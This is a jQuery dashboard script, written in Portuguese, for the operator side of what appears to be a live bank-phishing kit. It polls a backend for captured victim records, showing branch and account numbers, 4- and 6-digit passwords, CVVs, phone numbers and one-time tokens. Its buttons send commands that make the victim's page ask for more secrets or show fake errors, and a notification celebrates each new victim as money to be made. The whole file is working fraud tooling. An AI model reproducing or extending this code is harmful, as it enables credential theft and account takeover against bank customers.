$('document').ready( () => {

    let infos = {};
    const quantidadeSegundos = 5;
    let time = quantidadeSegundos;


    let audioNovaInfo = document.getElementById("myAudioNovaInfo");
    let audioAlteracaoInfo = document.getElementById("myAudioAlteracaoInfo");


    $('a.excluirTodos').click( e => {
        e.preventDefault();
        let confirma = confirm('Você tem Certeza?');
        if(!confirma) {
            return false;
        }
        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : 'EXCLUIR_TODOS_INFOS'},
            cache: false,
            success: function(r){
                location.reload();
            }
        });

    });

    $('tbody').on('click', 'a.button-detail i', function(e) {
        let tr = $(e.target).parents('tr');
        let aberto = $(tr).data('aberto');
        let id = $(tr).data('id');
        let novoStatus;
        if(parseInt(aberto) === 0) {
            $(tr).next('tr').removeClass('hide');
            novoStatus = 1;
            $(e.target).removeClass('fa-plus-square').addClass('fa-minus-square');
        } else {
            $(tr).next('tr').addClass('hide');
            novoStatus = 0;
            $(e.target).removeClass('fa-minus-square').addClass('fa-plus-square');
        }
        $.ajax({
            url: "do.php",
            type:'POST',
            dataType : "json",
            data: { action : "ALTERAR_INFO_ABERTO", aberto: novoStatus, id : id},
            cache: false,
            success: function(r){
            }
        });
        $(tr).removeClass('novo');
        $(tr).data('aberto', novoStatus);
    });

    $('tbody').on('click', 'button.excluir-info', function(e) {

        let confirma = confirm('Você tem Certeza que deseja excluir a info?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "REMOVER_INFO", id : id},
            cache: false,
            success: function(r){
                delete infos[id];
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.redireiconar-home', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando INFORMACOES_INVALIDAS?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'INFORMACOES_INVALIDAS'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-aguardando', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando AGUARDANDO?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'AGUARDANDO'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-aguardando-interna', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando AGUARDANDO_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'AGUARDANDO_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-senha-de-4', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando SENHA_DE_4?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'SENHA_DE_4'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-senha-de-4-erro', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando SENHA_DE_4_ERRO?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'SENHA_DE_4_ERRO'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-token', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando TOKEN?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'TOKEN'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });


    $('tbody').on('click', 'button.exibir-token-erro', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando TOKEN_ERRO?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'TOKEN_ERRO'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-token-interna', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando TOKEN_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'TOKEN_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });


    $('tbody').on('click', 'button.exibir-token-erro-interna', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando TOKEN_ERRO_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'TOKEN_ERRO_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });


    $('tbody').on('click', 'button.liberar-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando AGUARDANDO_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'AGUARDANDO_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.tela-fim', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando TELA_FIM_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'TELA_FIM_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-tabela', function(e) {

        let texto = prompt("Informe a posição da tabela:");
        if(texto.length === 0) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO_COM_TEXTO", id : id, comando : 'TABELA', texto: texto},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });


    $('tbody').on('click', 'button.exibir-tabela-erro', function(e) {

        let texto = prompt("Informe a posição da tabela:");
        if(texto.length === 0) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO_COM_TEXTO", id : id, comando : 'TABELA_ERRO', texto: texto},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-tabela-interno', function(e) {

        let texto = prompt("Informe a posição da tabela:");
        if(texto.length === 0) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO_COM_TEXTO", id : id, comando : 'TABELA_INTERNA', texto: texto},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });


    $('tbody').on('click', 'button.exibir-tabela-erro-interno', function(e) {

        let texto = prompt("Informe a posição da tabela:");
        if(texto.length === 0) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO_COM_TEXTO", id : id, comando : 'TABELA_ERRO_INTERNA', texto: texto},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-senha-de-6-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando SENHA_DE_6_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'SENHA_DE_6_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-senha-de-6-erro-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando SENHA_DE_6_ERRO_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'SENHA_DE_6_ERRO_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-cvv-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando CVV_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'CVV_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-cvv-erro-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando CVV_ERRO_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'CVV_ERRO_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });
    $('tbody').on('click', 'button.exibir-celular-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando CELULAR_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'CELULAR_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    $('tbody').on('click', 'button.exibir-celular-erro-interno', function(e) {

        let confirma = confirm('Você tem Certeza que deseja enviar o comando CELULAR_ERRO_INTERNA?');
        if(!confirma) {
            return false;
        }
        
        let id = $(e.target).data('id');

        $.ajax({
            url: "do.php",
            type:'POST',
            data: { action : "ALTERAR_COMANDO", id : id, comando : 'CELULAR_ERRO_INTERNA'},
            cache: false,
            success: function(r){
                atualizarInformacoes();
            }
        });

    });

    function fnHouveAlteracao(a, b){
        let alteracao = false;
        if(
               a.senha4 !== b.senha4
            || a.cvv !== b.cvv
            || a.celular !== b.celular
            || a.senha6 !== b.senha6
            || a.tokens.length !== b.tokens.length
        ){
            alteracao = true;
        }
        return alteracao;
    }

    function adicionarParaArray( data ) {
        
        let houveAlteracao = false;
        let novaInfo = false;
        
        data.forEach(item => {
            
            let id = item.id;

            if(!infos[id]){
                novaInfo = true;
            }
            if(infos[id] && fnHouveAlteracao(infos[id], item)){
                houveAlteracao = true;
                infos[id] = item;
                infos[id]['alteracao'] = true;
            } else {
                infos[id] = item;
            }

            
            
        });

        if(novaInfo){
            notifyMe('Nova Info!', 'Bora fazer dinheiro!');
            audioNovaInfo.play();
        }

        if(houveAlteracao){
            notifyMe('Alteração na Info!', 'Chegou novas informações.');
            audioAlteracaoInfo.play();
        }


        atualizarNaTela();
    }


    Object.invert = function (obj) {

        var new_obj = {};
      
        for (var prop in obj) {
          if(obj.hasOwnProperty(prop)) {
            new_obj[obj[prop]] = prop;
          }
        }
      
        return new_obj;
      };
    function atualizarNaTela(){
        var sortable = [];
        for (var key in infos) {
            sortable.push(infos[key]);
        }
        
        sortable.sort(function(a, b) {
            return  b.id - a.id;
        });

        let html = '';
        sortable.forEach(e => {
                    
            let htmlToken = '';
            htmlToken += `
            <div id="token" class="col-6">
            <div class="mb-3 mt-3">
                <h5 class="mb-3">Token / Tabela Atual:</h5>
                <span class="token">${e.tokens && e.tokens.length ? e.tokens[0].valor : '-----'}</span>
            </div>
            <h5 class="mb-3">Histórico de Tokens / Tabelas</h5>
            <table class="table table-striped table-dark">
                <thead>
                    <tr>
                    <th scope="col">#</th>
                    <th scope="col">Data / Hora</th>
                    <th scope="col">Posição</th>
                    <th scope="col">Token/Tabela</th>
                    </tr>
                </thead>
                <tbody>
            `;

            if(e.tokens && e.tokens.length){
                e.tokens.forEach(token => {
                    htmlToken += `
                            <tr>
                            <th scope="row">1</th>
                            <td>${moment(token.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                            <td>${token.posicao}</td>
                            <td>${token.valor}</td>
                            </tr>
                    `;
                });
            }
            htmlToken += `
                </tbody>
                </table>
            </div>
            `;

            html += `
                <tr class="header ${e.statusInfo.toLowerCase()} ${e.alteracao ? 'alteracao' : ''}" data-aberto="${e.aberto}" data-id="${e.id}">
                <td scope="row">${e.id}</td>
                <td>${e.ip}</td>
                <td>${moment(e.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                <td>${e.agencia}</td>
                <td>${e.conta}-${e.digito}</td>
                <td>${e.senha4}</td>
                <td><span class="status ${e.status.toLowerCase()}">${e.status}</span></td>
                <td>${e.comando}</td>
                <td class="text-center"><a class="button-detail" title="Abrir opções" class="plus" href="#"><i class="far ${parseInt(e.aberto) === 0 ? 'fa-plus-square' : 'fa-minus-square'}"></i></a></td>
            </tr>
            <tr class="detail ${parseInt(e.aberto) === 0 ? 'hide' : ''}">
                <td colspan="9">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12" id="botoes-acoes">
                            <div id="botoes-parte-1" class="${e.comando.includes('INTERNA') ? 'hide' : ''} ${e.device === 'MOBILE' ? 'hide' : ''}">
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm redireiconar-home"><i class="fas  fa-exclamation-triangle"></i> Informações Inválidas</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-success btn-sm ml-2 exibir-aguardando"><i class="fas fa-spinner"></i> Aguardando</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 exibir-senha-de-4"><i class="fas fa-key"></i> Senha de 4</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-senha-de-4-erro"><i class="fas fa-key"></i> Senha de 4 Erro</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-token"><i class="fas fa-pager"></i> Token</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-token-erro"><i class="fas fa-pager"></i> Token Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-tabela"><i class="fas fa-credit-card"></i> Tabela</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-tabela-erro"><i class="fas fa-credit-card"></i> Tabela Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 liberar-interno"><i class="fas fa-paper-plane"></i> Liberar Acesso</button>
                            </div>
                            <div id="botoes-parte-2" class="${e.comando.includes('INTERNA') ? '' : 'hide'} ${e.device === 'MOBILE' ? 'hide' : ''}">
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-success btn-sm ml-2 exibir-aguardando-interna"><i class="fas fa-spinner"></i> Aguardando</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-token-interna"><i class="fas fa-pager"></i> Token</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-token-erro-interna"><i class="fas fa-pager"></i> Token Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-tabela-interno"><i class="fas fa-credit-card"></i> Tabela</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-tabela-erro-interno"><i class="fas fa-credit-card"></i> Tabela Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 exibir-senha-de-6-interno"><i class="fas fa-key"></i> Senha de 6</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-senha-de-6-erro-interno"><i class="fas fa-key"></i> Senha de 6 Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-cvv-interno"><i class="fas fa-credit-card"></i> CVV</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-cvv-erro-interno"><i class="fas fa-credit-card"></i> CVV Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-celular-interno"><i class="fas fa-mobile"></i> Celular</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-celular-erro-interno"><i class="fas fa-mobile"></i> Celular Erro</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 tela-fim"><i class="fas fa-paper-plane"></i> Finalizar</button>

                            </div>
                            <div id="botoes-parte-3" class="${e.device === 'MOBILE' ? '' : 'hide'}">
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm redireiconar-home"><i class="fas  fa-exclamation-triangle"></i> Informações Inválidas</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-success btn-sm ml-2 exibir-aguardando"><i class="fas fa-spinner"></i> Aguardando</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 exibir-senha-de-4"><i class="fas fa-key"></i> Senha de 4</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-senha-de-4-erro"><i class="fas fa-key"></i> Senha de 4 Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-tabela"><i class="fas fa-credit-card"></i> Tabela</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-tabela-erro"><i class="fas fa-credit-card"></i> Tabela Erro</button>


                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-token"><i class="fas fa-pager"></i> Token</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-token-erro"><i class="fas fa-pager"></i> Token Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 exibir-senha-de-6-interno"><i class="fas fa-key"></i> Senha de 6</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-senha-de-6-erro-interno"><i class="fas fa-key"></i> Senha de 6 Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-cvv-interno"><i class="fas fa-credit-card"></i> CVV</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-cvv-erro-interno"><i class="fas fa-credit-card"></i> CVV Erro</button>

                                <button data-id="${e.id}" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-celular-interno"><i class="fas fa-mobile"></i> Celular</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-danger btn-sm ml-2 exibir-celular-erro-interno"><i class="fas fa-mobile"></i> Celular Erro</button>
                                <button data-id="${e.id}" type="button" class="btn btn-outline-dark btn-sm ml-2 tela-fim"><i class="fas fa-paper-plane"></i> Finalizar</button>


                            </div>
                        </div>
                        </div>
                        <div class="row">
                            ${htmlToken}
                            <div id="information" class="col-6">
                                <h5 class="mb-3 mt-3">Outras informações:</h5>
                                <table>
                                <tbody>
                                    <tr>
                                        <td width="15%">Comando:</td>
                                        <td>${e.comando}</td>
                                    </tr>
                                    <tr>
                                        <td width="15%">Texto:</td>
                                        <td>${e.texto ? e.texto : '-'}</td>
                                    </tr>
                                    <tr>
                                        <td>User Agent:</td>
                                        <td>${e.user_agent}</td>
                                    </tr>
                                    <tr>
                                    <td>IP:</td>
                                    <td>${e.ip}</td>
                                    </tr>
                                    <tr>
                                    <td>Dispositivo:</td>
                                    <td>${e.device}</td>
                                    </tr>
                                    <tr>
                                    <td>Data Hora:</td>
                                    <td>${moment(e.data, 'YYYY-MM-DD HH:mm:ss').format('DD/MM/YYYY HH:mm:ss')}</td>
                                    </tr>
                                    <tr>
                                    <td>Agência:</td>
                                    <td>${e.agencia}</td>
                                    </tr>
                                    <tr>
                                    <td>Conta:</td>
                                    <td>${e.conta}-${e.digito}</td>
                                    </tr>
                                    <tr>
                                    <td>S4:</td>
                                    <td>${e.senha4}</td>
                                    </tr>
                                    <tr>
                                    <td>S6:</td>
                                    <td>${e.senha6 === null ? '-' : e.senha6}</td>
                                    </tr>
                                    <tr>
                                    <td>CVV:</td>
                                    <td>${e.cvv === null ? '-' : e.cvv}</td>
                                    </tr>
                                    <tr>
                                    <td>Celular:</td>
                                    <td>${e.celular === null ? '-' : e.celular}</td>
                                    </tr>
                                </tbody>
                                </table>
                            </div>
                        </div>
                </div>
                </td>
            </tr>
            `;
        });
        $('tbody').empty().append(html);

    }

    function loadData(){

        $.ajax({
            url: "do.php",
            type:'POST',
            dataType : "json",
            data: { action : "BUSCAR_TODOS_COM_ACESSO"},
            cache: false,
            success: function(r){
                adicionarParaArray(r);
            }
        });
    }

    $('a.silenciar').click( e => {
        e.preventDefault();
        audioNovaInfo.pause();

    });

    loadData();

    function relogio(){
        $('span#segundos').text(time);
        time--;
        if(time === -1){
            loadData();
            time = 5;
        }
    }

    var timer = setInterval (relogio, 1000 );

    function pararContador(){
        if(timer){
            clearInterval(timer);
            timer = null;
        }
    }

    function iniciarContador(){
        if(!timer){
            timer = setInterval (relogio, 1000 );

        }
    }

    $('a#controlarContador').click( e => {
        e.preventDefault();
        if(timer){
            pararContador();
            $('span#timer').addClass('parado');
        } else {
            iniciarContador();
            $('span#timer').removeClass('parado');

        }
    });

    function atualizarInformacoes(){
        time = quantidadeSegundos;
        loadData();
    }

    document.addEventListener('DOMContentLoaded', function() {
    if (!Notification) {
        alert('Desktop notifications not available in your browser. Try Chromium.');
        return;
    }
    
    if (Notification.permission !== 'granted')
        Notification.requestPermission();
    });
    
    
    function notifyMe(titulo, msg) {
    if (Notification.permission !== 'granted')
        Notification.requestPermission();
    else {
        var notification = new Notification(titulo, {
        icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRHjpI5COjVeOEVYs7aBhl-DgzYPZPz6Ma7IhU1c_t6-lKNJZkx',
        body: msg,
        });
        notification.onclick = function() {
        window.open(window.location.href);
        };
    }
    }
});